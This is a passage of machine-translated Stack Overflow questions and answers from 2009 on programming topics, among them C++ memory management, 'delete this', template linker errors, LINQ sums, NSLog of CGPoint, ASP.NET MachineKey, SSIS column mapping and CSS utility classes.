对于 Web 开发/实践，我会推荐[Visual Web Developer Express](http://www.microsoft.com/express/download/)、[Visual Studio Express Edition](http://www.microsoft.com/express/download/)和[SQL Server Express](http://www.microsoft.com/express/sql/default.aspx)。使用 SQL express，您可以在 Web 应用程序的 app_code 文件夹中创建 MDF 文件。您可能会在 Web Dev Express 中完成大部分 Web 开发。但是，安装 VS Express 也很有用。

[这](http://msdn.microsoft.com/en-us/beginner/default.aspx)是开始使用这些应用程序的一个很好的信息来源。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T02:06:07.387

Visual C# 可以支持 WPF 浏览器应用程序。除此之外，它不会支持任何类型的 Web 开发。

# web-applications - 在所有平台上使用绝对网址是不是很糟糕？

> ID：550176
> 
> 赞同：0
> 
> 时间：2009-02-15T02:11:42.257
> 
> 标签：web-applications, relative-path, absolute-path

在我看来，在 asp.net 中更普遍的是通过始终使用虚拟目录替换“~/”形式的路径来成为“虚拟目录不可知论”，但这对于其他绝对的平台来说似乎没什么大不了的路径更常见。我可能会将 django 命名为其中之一。

在 asp.net 中使用绝对 url 是不好的形式吗？在其他平台？如果是这样，为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T02:17:17.893

我通常更倾向于使用相对路径。它允许我在必要时移动我的应用程序，或者在某种程度上我可以重命名目录而不会破坏任何东西。我还发现从测试或开发环境中复制应用程序更容易，并且不必担心由于服务器名称更改而导致绝对引用中断。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-19T06:09:10.550

在大多数情况下，没有理由这样做。相对路径可以完成相同的工作，而不会将您的网站绑定到 url。当在测试服务器或软件上开发以在多个域上运行时，这特别方便，因为它可以被复制而不会造成伤害。

如果您确实想使用绝对 URL，您应该考虑从浏览器 URL 中提取协议和域，这样至少它在您端仍然是可移植的。

# c++ - C++ 指针片段

> ID：550181
> 
> 赞同：2
> 
> 时间：2009-02-15T02:17:41.977
> 
> 标签：c++, pointers

大家好。这是我在 stackoverflow 上的第一个问题，所以请多多包涵。

这学期我的编程课是Java；上学期是 C++。我的 Java 老师觉得（我认为这是有道理的）我们学生理解内存管理的机制非常重要。

由于 Java 具有自动垃圾收集功能，因此他认为适合给我们一个任务，在该任务中，我们必须用 C++ 编写一个非常基本的程序，该程序使用指针创建一个二维数组。具体来说，我们首先要创建一个指针数组；第一个数组中的每个指针都应该引用它自己的整数数组。然后我们必须释放与这两个数组关联的内存。

这个赋值应该由两个函数组成：一个是分配二维数组，另一个是释放。在继续之前，我只想确保以下代码在逻辑上是合理的。

我确信这一切看起来都很简单，但问题是我的 C++ 老师花了整整两天时间在指针上。虽然我对机制*有所*了解，但我对实施一无所知。话虽如此，以下是一个非常艰难的开始。这在逻辑上合理吗？我完全偏离标准了吗？我最深切地感谢任何帮助。

编辑：我用更新的代码创建了一个新问题。您可以通过单击[此处](https://stackoverflow.com/questions/550223/update-c-pointer-snippet)查看它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T02:22:25.353

对我来说看起来是正确的，但有一个例外 - 当您删除数组时，您需要以下语法：

```
delete [] arrayName; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T02:22:56.240

当你使用

```
int* i = new int; 
```

你把它和

```
delete i; 
```

当你使用

```
int* i = new int [12]; 
```

你把它和

```
delete [] i; 
```

如果new里面有括号，delete里面应该也有括号。否则，您的程序在我看来是合理的，只是您还没有实现教授希望您执行的这两个功能。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T02:36:47.080

这是一个很好的问题。

我不认为我会称它为“二维数组”：它是数组数组，而不是二维数组。

我想我会调用我的索引`i`or `iColumn`or`iRow`代替`nCount`（你的`nRows`and`nColumns`在逻辑上是 const 并用作栅栏/高水位线值，而你`nCount`的是循环索引）。

对于奖励积分，请考虑如何测试您的解决方案。您可以运行它来查看它是否有故障……但反过来，即没有故障，并不能证明它是正确的。你在什么操作系统上运行它？如果您使用的是 Linux，那么一个有价值的测试是使用运行您的代码`valgrind`（因为当您运行它时，它`valgrind`可以自动检测到许多可能滥用内存的方式）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T02:23:03.603

您需要使用`delete []`而不仅仅是`delete`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T02:26:50.647

它看起来很合理（逻辑上）。顺便说一句 - 运行一个程序并让它失败是可以的。:-)

# c# - 如何计算 LINQ 中 DataTable 的列的总和（到数据集）？

> ID：550187
> 
> 赞同：36
> 
> 时间：2009-02-15T02:24:27.470
> 
> 标签：c#, linq, datatable, sum

我刚刚开始阅读 LINQ，我想开始将它合并到我的代码中。我知道如何通过“Foreach”遍历行或在特定列上执行 compute.sum 来计算 DataTable 列的总和。如何使用 LINQ to DataSet 进行等效操作？

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2009-02-15T03:32:26.807

如果没有类型（替换`int`为正确的数据类型）：

```
 var sum = table.AsEnumerable().Sum(x=>x.Field<int>(3)); 
```

或者：

```
 var sum = table.AsEnumerable().Sum(x=>x.Field<int>("SomeProperty")); 
```

如果键入：

```
 var sum = table.Sum(x=>x.SomeProperty); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-12-05T19:14:35.720

**如果您的数据字段是整数**

```
var sum = TableData.Sum(x => x.FieldName); 
```

**如果您的数据字段是字符串，那么您需要将其解析为整数**

```
var sum = TableData.Sum(x => Int32.Parse(x.FieldName)); 
```

**如果您的数据字段是字符串，并且您想将结果存储为字符串**

```
var sum = TableData.Sum(x => Int32.Parse(x.FieldName)).ToString(); 
```

# virtualization - 将文件从 PC 复制到 VPC？

> ID：550188
> 
> 赞同：1
> 
> 时间：2009-02-15T02:24:51.853
> 
> 标签：virtualization, virtual-pc, vpc

我正在运行 VPC 2007，操作系统是 windows 3.1 我需要将 C++ 编译器从我的真实计算机复制到虚拟计算机。我该怎么做，它似乎没有阅读我制作的.iso。因为我用的是笔记本电脑，所以我没有软盘驱动器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T02:27:17.930

您可以将文件从 PC 拖放到 VPC。Windows 3.1 支持拖放，所以（原则上）这应该可以工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T02:31:01.527

在 VPC 2007 中，单击客户操作系统周围框架左下角的黄色文件夹。这将允许您将主机上的文件夹映射到客户机上的驱动器号。然后在来宾中，您可以像访问网络驱动器一样访问映射的驱动器。

# c++ - “删除”是否安全？

> ID：550189
> 
> 赞同：33
> 
> 时间：2009-02-15T02:25:16.670
> 
> 标签：c++, runtime-error, self-destruction

在我最初的基本测试中，这样做是完全安全的。但是，让我感到震惊的是，稍后尝试在s`this`的函数中进行操作可能是运行时错误。这是真的吗？通常安全吗？还是只有某些情况下它是安全的？`delete``this``delete this`

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2009-02-15T02:36:31.653

`delete this`是合法的，并且可以满足您的期望：它调用您的类的析构函数并释放底层内存。返回后`delete this`，您的`this`指针值不会*改变*，因此它现在是一个不应取消引用的悬空*指针*。这包括使用类的成员变量进行隐式取消引用。

通常在引用计数类中发现，当引用计数减为 0 时，`DecrementRefCount()`// `Release()`whatever 成员函数调用`delete this`.

`delete this`由于许多原因，通常被认为是非常糟糕的形式。之后很容易意外访问成员变量`delete this`。调用者代码可能没有意识到您的对象已自毁。

此外，`delete this`您的代码可能没有针对对象所有权（谁分配和谁删除）的对称策略，这是一种“代码味道”。~~一个对象不能用 来分配自己`new`，所以调用`delete this`意味着 A 类正在分配一个对象，但 B 类稍后会释放它[self]。~~

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-02-15T02:28:54.680

只要它本质上是方法中的最后一个操作，删除“this”是安全的。事实上，有几个专业级别的 API 会这样做（请参阅 ATL 的 CComObject 实现以获取示例）。

唯一的危险是在调用“delete this”之后尝试访问任何其他成员数据。这当然是不安全的。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-02-15T02:41:46.617

但不要在析构函数中这样做！

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-02-15T02:41:37.273

正如其他人已经提到的那样，删除它是完全合法的。由于尚未提及的另一个原因，这是有风险的 - 您假设对象已在堆上分配。这可能很难保证，尽管在引用计数实现的情况下通常不是问题。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-15T02:41:43.747

正如其他人所说， delete 这是一个有效的习惯用法，但为了安全起见，您必须确保该对象永远不会在堆栈上实例化。

一种方法是使构造函数和析构函数都是私有的，并通过类工厂函数强制创建对象，该函数在堆上创建对象并返回指向它的指针。类工厂可以是静态成员函数或友元函数。然后可以通过对执行“删除此”的对象的 Delete() 方法进行清理。COM 对象基本上以这种方式工作，除了它们是引用计数的，当引用计数减为零时会发生“删除这个”。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-02-15T02:28:09.393

是的。应该没问题。“这”只是一个指针。任何指针都可以删除。有关如何删除对象的信息包含在堆记录中。这就是 IUnknown::Release() 通常在 COM 对象中实现的方式。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2009-02-15T02:38:59.523

当您有要删除的对象的子类时，删除这可能会导致问题。请记住，构建从上到下开始，删除从下到上开始。因此，如果删除它位于层次结构的中间，您基本上会丢失该特定类下的所有对象。

当你实现一个引用计数的对象时，delete 非常方便，COM 类就是一个例子。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-02-15T02:30:53.273

[阅读](https://stackoverflow.com/questions/522637/should-objects-delete-themselves-in-c)类似的讨论。您的理解是正确的，因为它确实有效，是必需的，并且可能很危险，因为您之后无法访问它。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-02-15T06:46:10.977

合法 是
安全 否

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2016-02-04T09:24:17.640

如果您是从基类继承并在基类函数中给出了 delete this，则使用派生类指针将导致崩溃。例如：

```
class Base
{

    virtual void Release()
    {
        delete this;
    }

}

class Derived : public Base
{

    void Foo()
    {
        ...
    }

}

main()
{

    Base *ptrDerived = new Derived();
    ptrDerived->release();
    ptrDerived->Foo() //Crash

} 
```

# windows-vista - 在 DWM 中为现有窗口制作“始终位于顶部”缩略图有多容易

> ID：550194
> 
> 赞同：1
> 
> 时间：2009-02-15T02:28:28.020
> 
> 标签：windows-vista, dwm

我真的很喜欢当你将鼠标悬停在任务栏上的 Vista 中的一个窗口上时，它会给你一个小小的预览。如果是视频，它甚至会在缩略图中播放。

通常我真的希望我能“撕掉”这个小窗口，并将其作为“始终在顶部”的缩略图保留在我的屏幕上。也许它是我正在观看的进度条，也许它是我想要一个小小的预览的视频。

这不是 DWM 使编程变得容易的那种东西吗？这会是在良好的托管 C# 中进行编程的简单尝试 - 还是我最终会陷入棘手的 API 问题？

我对现有的解决方案和关于如何编写这样的代码的指针都感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-08-12T17:13:00.777

很抱歉在这里自我推销。:) 只是提到已经有一个应用程序可以让您克隆每个顶级窗口并保持它们的预览“始终在顶部”：[OnTopReplica](http://ontopreplica.codeplex.com)。

该程序基于[Windows Forms Aero](http://windowsformsaero.codeplex.com/)库，这是一个包含一些 DWM 包装器的 .NET (c#) 库。不需要复杂的 API 东西（此外，API 还是很简单的）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-12T08:38:58.810

如何在 C# 中使用它的一个很好的预览：

[http://community.bartdesmet.net/blogs/bart/archive/2006/10/05/4495.aspx](http://community.bartdesmet.net/blogs/bart/archive/2006/10/05/4495.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T11:30:24.867

是的，您可以创建自己的类似任务栏的缩略图。不过，您将不得不进行大量的窗口句柄操作。它的工作原理基本上是您在表单中创建一个将作为缩略图的子窗口。您可以使用常用技巧获取想要缩略图的顶级窗口的窗口句柄。然后调用 DWM 函数 DWMRegisterThumbnail 将两者关联起来。您实际上根本不参与绘制缩略图 - 一旦关联了窗口，DWM 合成过程就会负责在您的表单中绘制顶级窗口的缩略图。

[MSDN 文档](http://msdn.microsoft.com/en-us/library/aa969540.aspx)

# c - 是否可以使用 NSLog C 结构（如 CGRect 或 CGPoint）？

> ID：550195
> 
> 赞同：417
> 
> 时间：2009-02-15T02:28:30.300
> 
> 标签：c, objective-c, cocoa, cocoa-touch

我希望能够调试 C 结构，而不必显式键入它们所包含的每个属性。

即我希望能够做这样的事情：

```
CGPoint cgPoint = CGPointMake(0,0);
NSLog(@"%@",cgPoint); 
```

显然 '%@' 不起作用，因此问题。

* * *

## 回答 #1

> 赞同：806
> 
> 时间：2009-02-15T03:18:33.393

你可以试试这个：

```
NSLog(@"%@", NSStringFromCGPoint(cgPoint)); 
```

[UIKit 提供](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIKitFunctionReference/Reference/reference.html#//apple_ref/doc/uid/TP40006894-CH3-SW34)了许多将各种 CG 结构转换为`NSString`s的函数。它不起作用的原因是因为它`%@`表示一个对象。A`CGPoint`是一个 C 结构（`CGRect`s 和`CGSize`s 也是如此）。

* * *

## 回答 #2

> 赞同：236
> 
> 时间：2011-03-04T15:20:56.137

有几个功能，例如：

```
NSStringFromCGPoint  
NSStringFromCGSize  
NSStringFromCGRect  
NSStringFromCGAffineTransform  
NSStringFromUIEdgeInsets 
```

一个例子：

```
NSLog(@"rect1: %@", NSStringFromCGRect(rect1)); 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2012-11-20T10:17:14.817

```
NSLog(@"%@", CGRectCreateDictionaryRepresentation(rect)); 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-02-15T03:50:53.457

我使用以下宏来帮助我解决 NSRect：

```
#define LogRect(RECT) NSLog(@"%s: (%0.0f, %0.0f) %0.0f x %0.0f",
    #RECT, RECT.origin.x, RECT.origin.y, RECT.size.width, RECT.size.height) 
```

你可以为 CGPoint 做类似的事情：

```
@define LogCGPoint(POINT) NSLog(@"%s: (%0.0f, %0.0f)",
    #POINT POINT.x, POINT.y); 
```

使用它如下：

```
LogCGPoint(cgPoint); 
```

将产生以下内容：

```
cgPoint: (100, 200) 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2013-07-08T12:33:05.147

你可以用`NSValue`这个。NSValue对象是单个 C 或 Objective-C 数据项的简单容器**。**它可以保存任何标量类型，例如 int、float 和 char，以及指针、结构和对象 ID。

**例子：**

```
 CGPoint cgPoint = CGPointMake(10,30);
    NSLog(@"%@",[NSValue valueWithCGPoint:cgPoint]); 
```

**输出 ：** `NSPoint: {10, 30}`

希望它可以帮助你。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2011-06-13T19:29:22.150

由于 Stack Overflow 损坏的 RSS 刚刚为我重新提出了这个问题，所以这是我几乎通用的解决方案：[JAValueToString](https://github.com/JensAyton/JAValueToString)

这使您可以编写`JA_DUMP(cgPoint)`和`cgPoint = {0, 0}`登录。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2017-03-10T14:26:21.960

是的，您可以使用以下几个函数，例如：首先您必须将 CGPoint 结构转换为字符串，请参见示例

```
1) NSStringFromCGPoint,  
2) NSStringFromCGSize,  
3) NSStringFromCGRect,  
4) NSStringFromCGAffineTransform,  
5) NSStringFromUIEdgeInsets, 
```

例如：

```
1) NSLog(@"NSStringFromCGPoint = %@", NSStringFromCGRect(cgPointValue)); 
```

像这样...

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-03-30T09:02:11.513

```
NSLog(@"%@",CGRectCreateDictionaryRepresentation(rect)); 
```

# c# - 托管语言的 Judy 数组

> ID：550204
> 
> 赞同：11
> 
> 时间：2009-02-15T02:35:59.877
> 
> 标签：c#, arrays, data-structures, managed

[Judy 数组](http://en.wikipedia.org/wiki/Judy_array)是一种快速数据结构，可以表示一个稀疏数组或一组值。是否有针对 C# 等托管语言的实现？谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-02-16T15:12:05.730

值得注意的是，如果您在谷歌上搜索它们，它们通常被称为 Judy Trees 或 Judy Tries。

我还寻找了一个 .Net 实现，但一无所获。另外值得注意的是：

该实现主要围绕高效缓存使用而设计，因为此类实现细节可能高度依赖于子结构中使用的某些构造的大小。.Net 托管实现在这方面可能有所不同。

我可以看到一些重大障碍（我的简短扫描可能错过了更多）

*   API 有一些相当反面向对象的方面（例如，空指针被视为空树），因此过于简单，将状态指针移动到 LHS 并使函数实例方法转换为 C++ 不起作用。
*   我看到的子结构的实现大量使用了指针。我看不到这些被有效地翻译成托管语言的引用。
*   实现是许多非常复杂的想法的提炼，这些想法掩盖了公共 api 的简单性。
*   代码库大约有 20K 行（其中大部分很复杂），这对我来说并不是一个简单的移植。

您可以使用该库并将 C 代码包装在 C++/CLI 中（可能只是在内部保存一个指针，该指针是 c api trie，并且所有 c 调用都指向这个指针）。这将提供一个简单的实现，但本机实现的链接库可能有问题（内存分配也可能有问题）。您可能还需要在转换时将 .Net 字符串转换为普通的旧字节 *（或者直接使用字节）

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-02-18T18:37:11.430

Judy 确实不太适合托管语言。我认为您无法使用 SWIG 之类的东西并自动完成第一层。

我编写了 PyJudy，最终不得不进行一些重要的 API 更改以适应 Python。例如，我在文档中写道：

> JudyL 数组将机器字映射到机器字。在实践中，这些词存储无符号整数或指针。PyJudy 支持所有四种映射作为不同的类。

*   pyjudy.JudyLIntInt - 将无符号整数键映射到无符号整数值
*   pyjudy.JudyLIntObj - 将无符号整数键映射到 Python 对象值
*   pyjudy.JudyLObjInt - 将 Python 对象键映射到无符号整数值
*   pyjudy.JudyLObjObj - 将 Python 对象键映射到 Python 对象值

我已经有几年没有看过代码了，所以我对它的记忆非常模糊。它是我的第一个 Python 扩展库，我记得我曾经编写过一种用于代码生成的模板系统。现在我会使用像genshi这样的东西。

我无法指出 Judy 的替代品——这就是我搜索 Stackoverflow 的原因之一。

编辑：有人告诉我，我在文档中的计时数字与 Judy 的文档建议不一致，因为 Judy 是为 64 位缓存线开发的，而我的 PowerBook 只有 32 位。

其他一些链接：

*   帕特里夏尝试（[http://www.csse.monash.edu.au/~lloyd/tildeAlgDS/Tree/PATRICIA/](http://www.csse.monash.edu.au/~lloyd/tildeAlgDS/Tree/PATRICIA/)）
*   双数组尝试（[http://linux.thai.net/~thep/datrie/datrie.html](http://linux.thai.net/~thep/datrie/datrie.html)）
*   HAT-trie ( [http://members.optusnet.com.au/~askitisn/index.html](http://members.optusnet.com.au/~askitisn/index.html) )

最后一个有不同高性能 trie 实现的比较数字。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T07:23:01.980

事实证明这比我想象的要棘手。[PyJudy和](http://www.dalkescientific.com/Python/PyJudy.html)[Tie::Judy](http://search.cpan.org/~bholzman/Tie-Judy-0.04/lib/Tie/Judy.pm)可能值得一看。[Softpedia](http://linux.softpedia.com/get/Programming/Libraries/Judy-5433.shtml)上有一些东西，还有一些[Ruby-ish](http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-talk/48365)的东西。麻烦的是，这些都不是专门的.NET。

# c# - ASP.NET 中 MachineKey 的用途

> ID：550210
> 
> 赞同：16
> 
> 时间：2009-02-15T02:38:03.177
> 
> 标签：c#, asp.net, cookies, viewstate, machinekey

机器密钥在 asp.net 中有哪些不同的用途？我认为以下是正确的，但认为可能还有更多。

1.  多个应用程序可以使用同一个 cookie
2.  多个服务器可以使用相同的视图状态

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-02-15T17:03:34.443

MachineKey 用于：

*   ViewState 加密和验证
*   表单身份验证（或联合身份验证）使用此密钥签署身份验证票

在多台服务器上安装 Web 应用程序需要在所有服务器上配置相同的机器密钥才能使负载平衡正常工作。

要查看所有详细信息，请参阅：[MSDN 如何：在 ASP.NET 2.0 中配置 MachineKey](http://msdn.microsoft.com/en-us/library/ms998288.aspx#paght000007_machinekeyexplained)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-04-01T19:02:14.613

机器密钥也用于加密/解密 webresources.axd 参数。

即使在单个服务器上也应该配置机器密钥，因为应用程序域的任何回收都会在设置为自动时生成一个新密钥。这会导致仅在回收之前呈现的页面的下一次回发，从而导致视图状态验证错误，并且在此期间也会出现资源问题。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2009-02-15T03:11:28.980

加密 - 很常见。

# ssis - 列顺序更改后 SSIS 包失败

> ID：550217
> 
> 赞同：-1
> 
> 时间：2009-02-15T02:42:15.633
> 
> 标签：ssis

我有一个 SSIS 包，它从平面文件中进行简单读取并插入 SQL Server 2005。它在一台计算机（计算机 1）上运行良好，源和目标都指向本地。

然后，该包被移动到另一台计算机（计算机 2），一切都指向本地，并开始失败。看了一会，原来是两台机器上目标表的列顺序不同。包失败，因为它试图将数据写入错误的表列。也就是说，在计算机 1 上，列是 A、B、C，而在计算机 2 上，它们是 C、A、B - 程序包试图将 A 的数据写入计算机 2 上的 C 等。

我在这里错过了什么吗？在写入 OLE DB 目标时，SSIS 是否真的依赖于列顺序，而不是列名？还是我的设置不好？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-17T15:23:08.253

SSIS 从连接中读取元数据并将其与映射一起存储。有时它可以检测到更改并给出验证错误（在这种情况下，包将在验证时失败，您必须更改包以更正问题）。如果您打开包装，您有时可以在设计器中看到这一点，它会提供更正列。

在某些情况下，它不会在验证阶段检测到更改，并且在插入期间会失败。

所以我的问题是，它是在验证期间还是在以后的执行阶段失败了？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-18T07:55:44.227

使用 Oracle 作为源或目标时也是如此。它不会在执行期间检测列更改和失败。每次更改列顺序或添加新列时，我都会更新数据流任务。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-02-15T07:18:50.583

你检查过数据流任务中的列映射吗？有时映射会消失或指向错误的列。在您的情况下，SSIS 包被移动，那么映射很可能已损坏。我认为你只需要更正映射，它应该是一个修复。

# c++ - 使用模板链接错误

> ID：550219
> 
> 赞同：1
> 
> 时间：2009-02-15T02:48:16.880
> 
> 标签：c++, templates, linkage

我将函数转换为模板，并开始出现此错误。我一定不理解模板的限制。有人能告诉我为什么这会坏吗？

我收到此错误：

```
Undefined symbols:
  "bool foo<int>(int const&, int const&)", referenced from:
      _main in file1.o
ld: symbol(s) not found 
```

当我链接以下代码时。代码已简化，但仍然失败。第一个文件包含：

```
#include <iostream>
template <class T> bool foo (const T&, const T&);

int main ()
{
  int left = 1;
  int right = 2;

  if (foo <int> (left, right))
    std::cout << "foo!" << std::endl;

  return 0;
} 
```

第二个文件包含：

```
template <class T> bool foo (const T& left, const T& right)
{
  return true;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T02:59:49.367

由于 Uri 给出的原因，模板方法通常在头文件中定义。因为你的是一个函数而不是一个类的方法，所以将它显式定义为静态或内联（在头文件中可能包含在多个 CPP 文件中）。

**把它放在你的 foo.h**

```
template<class T> inline bool foo (const T& left, const T& right)
{
  return true;
} 
```

**把它放在你的 main.cpp**

```
#include <iostream>
#include "foo.h"

int main ()
{
  int left = 1;
  int right = 2;

  if (foo <int> (left, right))
    std::cout << "foo!" << std::endl;

  return 0;
} 
```

cpp 代码现在可以看到模板函数的整个声明。

此处列出了其他解决方案：[如何避免模板函数出现链接器错误？](http://www.parashift.com/c++-faq-lite/templates.html#faq-35.13)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T02:55:45.133

自从我做了很多 C++ 以来已经有好几年了，但我认为你遇到了单独编译的问题。模板在编译时实例化，而不是链接。

因此，当您调用 foo() 时，您并没有真正实例化模板，因为没有生成新的函数代码，您只是创建了一个链接器必须解析的符号。

然而，当第二个文件被编译时，它只有模板并且它从未被实例化，因此没有生成实际处理 int 的 foo() 版本。结果，当您将所有内容链接在一起时，您会收到错误消息。

我不是 100% 确定该怎么做，但我怀疑你需要在第二个文件中强制实例化 foo() 和整数（假设它是 C++）。我只使用类模板，而不是函数模板，我相信这里有人会给你一些确切的代码......

# c++ - 更新：C++ 指针片段

> ID：550223
> 
> 赞同：1
> 
> 时间：2009-02-15T02:58:05.330
> 
> 标签：c++, pointers

再次问候，再次感谢为第一个问题提供答案的所有人。以下代码已更新为包含每个分配的两个函数。

要查看原始问题，请单击[此处](https://stackoverflow.com/questions/550181/c-pointer-snippet)。

我*很*确定这满足了任务的要求，但我再次非常感谢任何帮助。我是否适当地修改了删除语句？再次感谢。

```
#include<iostream>
#include<string>

int** createArray(int, int);
void deleteArray(int*[], int);

using namespace std;

int main()
{
    int nRows;
    int nColumns;

    cout<<"Number of rows: ";
    cin>>nRows;

    cout<<"Number of columns: ";
    cin>>nColumns;

    int** ppInt = createArray(nRows, nColumns);

    deleteArray(ppInt, nRows);
}

int** createArray(int nRows, int nColumns)
{
    int** ppInt = new int*[nRows];

    for (int nCount = 0; nCount < nRows; nCount++)
    {
        ppInt[nCount] = new int[nColumns];
    }

    return ppInt;
}

void deleteArray(int** nPointer, int nRows)
{
    for (int nCount = 0; nCount < nRows; nCount++)
    {
        delete[] nPointer[nCount];
    }

    delete[] nPointer;
} 
```

PS这是作业文档本身，以防万一：

(1) 设计并实现一个为二维整数数组分配内存的函数：该函数需要两个整数作为参数，一个为行数，一个为列数。您需要在此函数中使用“new”运算符。请记住，我们需要首先创建一个指针数组。然后，对于该数组中的每个指针，我们需要创建一个整数数组。该函数应该返回一个指向二维整数数组的指针。

(2) 设计并实现一个函数来为这个二维数组释放内存：该函数应该有两个参数（一个指向二维整数数组的指针，另一个是数组的行数）数组）。在函数中，您应该使用“delete”运算符为这个二维数组取消分配内存。您应该首先删除每一行（整数数组），然后删除指针数组。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T03:51:08.133

代码看起来不错。

但是，对于我们人类来说，您可能需要解决一些问题：

1.  您的函数签名（声明）缺少参数名称。更加合适：

    ```
    int** createArray(int rows, int columns);
    void deleteArray(int** array, int rows);

    ```

2.  *您的函数名称对于它们真正*创建/删除 的内容并不太具有描述性。`create2DArray`例如，这将是一个更明智的选择。

3.  你`n`的变量前缀伤害了我的眼睛。 `numRows`或者`rowCount`更具可读性。
4.  同样，`ppInt`是疯了。尝试`array`（`nPointer`同样，为了一致性）。（可悲的是，你不能写`2dArray`。）
5.  `i`用作循环计数器比或类似使用更常见`nCount`（尤其是对于数组索引）。我建议你改用它。

一些超越和超越的东西，供您个人练习：

1.  创建一个将`rows`和`cols`作为其构造函数的参数的类。确保自动解除分配数组。
2.  为您的类使用`std::vector`并创建一个`resize`成员函数。 *请注意，这偏离了原始问题，该问题要求指针。*
3.  创建一个`copy`函数和一个`clone`函数以将数据复制到另一个二维数组（可能具有不同的大小！）或克隆现有数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T06:38:32.757

没关系。

问题是您没有考虑代码中的异常安全性。

```
int** ppInt = new int*[nRows];   // ALLOC 1

for (int nCount = 0; nCount < nRows; nCount++)
{
        ppInt[nCount] = new int[nColumns]; // ALLOC 2
} 
```

说 ALLOC 1 没问题。
但是，如果 ALLOC 2 中的任何一个失败，那么您就会遇到异常和严重的内存泄漏。

例如。
你在第四次调用 ALLOC 2 时失败了。然后你从 ALLOC 1 和前三个调用 ALLOC 2 泄漏内存。现在在你的情况下，代码是如此微不足道，它可能无关紧要。但这是您在编写 C++ 代码时应始终牢记的事情。

如果抛出异常，这里会发生什么，哪些资源将被泄露，哪些资源不会被正确清理。

我认为您应该考虑将二维数组包装在一个类中，以便即使存在异常也可以保证正确分配和取消分配内存。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T03:09:35.770

在我看来是合理的。

不过，我不确定是否要提交一个全新的问题。作为对原作的修正可能会更好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T05:45:14.210

对于“deleteArray”，您的原型和定义并不完全相同：

```
void deleteArray(int*[], int);
void deleteArray(int** nPointer, int nRows) 
```

它们确实具有相同的含义，但为了清楚起见，我认为最好让它们完全相同（倾向于使用 `int**' 来强调您正在传递指针的事实）以保持一致性。

此外，在原型中包含参数名称。

# css - 定义什么好的“标记”CSS样式？

> ID：550226
> 
> 赞同：2
> 
> 时间：2009-02-15T03:00:57.193
> 
> 标签：css, css-selectors

我发现定义'标记' css 样式很有用，例如我可以轻松地将某些内容标记为隐藏`'hidden'`或`'selected'`选定 - 特别是在使用基于标签的技术（如 ASP.NET MVC 或 PHP）时。

```
.hidden
{
    display:none;
}

.newsItemList li.selected
{
    background-color: yellow;
} 
```

我并不特别想[在这里重新发明轮子](http://www.codinghorror.com/blog/archives/001145.html)，并想知道其他类似的东西是有用的还是常见的——或者是否有任何需要注意的陷阱。

我应该为其他类似的事情查看任何特定的 css 框架吗？另外，我可以搜索这种类型的 css 类的名称。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-15T20:11:19.123

我同意其他发帖人的观点，他们说只定义你需要的东西，而不是用一堆不必要的类来膨胀你的代码。

话虽如此，我发现自己经常使用以下内容：

*   .accessibility - 视觉上隐藏元素，但为屏幕阅读器和打印样式表保持完整
*   .clear - 绑定到[Easy Clearing](http://www.positioniseverything.net/easyclearing.html)
*   .first-child 和 .last-child - 轻松地将样式分配给容器中的第一个/最后一个项目。这多次成为救命稻草，我更喜欢它而不是支持不佳的 :pseudo 选择器
*   .replace - 绑定到[Phark IR](http://www.mezzoblue.com/tests/revised-image-replacement/)用于透明图像替换

最后，我动态分配`.js`给`<html>`元素

```
<script type="text/javascript">if(h=document.documentElement)h.className+=" js"</script> 
```

这将允许我定义 .js *（选择器的其余部分）*样式以仅针对启用了 JavaScript 的浏览器。

* * *

## 回答 #2

> 赞同：1
> 
